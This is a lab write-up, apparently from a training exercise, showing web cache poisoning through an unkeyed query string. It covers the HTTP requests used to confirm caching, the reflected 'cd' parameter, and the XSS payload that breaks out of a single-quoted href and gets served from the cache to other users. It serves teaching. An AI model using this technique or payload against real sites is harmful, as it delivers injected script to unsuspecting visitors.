# Web Cache Poisoning via an Unkeyed Query String


## Definition


**Web Cache Poisoning** occurs when an attacker causes a cache to store a malicious HTTP response, which is then served 
to other users.



In this lab, the vulnerability is caused by an **unkeyed query string** that affects the response but is not properly 
included in the cache key.



## Goal



Poison the home page cache with a response that executes:



```html

<script>alert(1)</script>

```



## 1. Identify Cache Behavior



First, we sent:



```http

GET /?cd=jkkmnm HTTP/2

```



The response contained:



```http

Cache-Control: max-age=35

Age: 26

X-Cache: hit

```



This confirmed that the response was being cached.



## 2. Test the Query Parameter




We changed the `cd` parameter:




```http

GET /?cd=TEST12345 HTTP/2

```



The first request returned:



```http

X-Cache: miss

Age: 0

```



The value of `cd` was reflected in the response:



```html


<link rel="canonical" href='//.../?cd=TEST12345'/>

```



Sending the same request again returned:



```http

X-Cache: hit

```



This showed that the response influenced by the query parameter was being cached.



## 3. Identify the XSS Injection Point



The parameter was reflected inside a single-quoted `href` attribute:



```html

href='...'

```




Therefore, we used a single quote to break out of the attribute:



```text
'><script>alert(1)</script>

```



The resulting HTML was effectively:


```html

<link rel="canonical" href='//...?cd='><script>alert(1)</script>'/>

```



The payload:



1. Closes the `href` attribute with `'`

2. Breaks out of the attribute with `>`

3. Injects a `<script>` element

4. Executes `alert(1)`



## 4. Poison the Cache



The malicious request was then cached.


The attack flow was:



```text

Attacker

   ↓

Malicious query string

   ↓


Server reflects payload

   ↓

Poisoned response is cached

   ↓

Victim requests homepage

   ↓

Cached malicious response is served

   ↓

alert(1) executes

```



## Key Takeaway



The vulnerability can be summarized as:



```text

Unkeyed Input

      +

Input affects Response

      +

Response is Cacheable

      =

Web Cache Poisoning

```



### Payload



```text

'><script>alert(1)</script>

```





### Main Lesson



A query parameter does not necessarily form part of the cache key.



If an unkeyed parameter can influence a cacheable response, an attacker may be able to inject malicious content into the 
cached response and deliver it to other users.

